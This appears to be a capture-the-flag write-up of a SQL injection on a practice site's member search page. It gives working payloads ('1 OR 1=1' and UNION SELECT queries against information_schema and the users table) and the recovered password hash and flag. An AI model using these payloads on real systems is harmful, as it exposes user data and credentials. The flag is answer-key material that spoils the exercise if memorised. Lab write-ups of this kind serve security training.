# How to exploit

We went on the search member page. By typing ```1 OR 1=1``` we saw all the input, here members, in the database. We saw a member named ```GetThe Flag```. Then we get the name of the tables and the name of the columns with the following expression: ```135 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns```. In the table ```users``` with have the following columns: ```user_id``` ```first_name``` ```last_name``` ```town``` ```country``` ```planet``` ```countersign``` and ```Commentaire```. By getting the Commentaire and the countersign with this expression ```135 or 1=1 UNION select Commentaire,countersign FROM users``` we identify the ```Commentaire``` and the ```countersign``` of the ```GetThe Flag``` user which was ```Decrypt this password -> then lower all the char. Sh256 on it and it's good !``` and ```5ff9d0165b4f92b14994e5c685cdce28```. By following the instruction we finally got the flag: ```10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5```
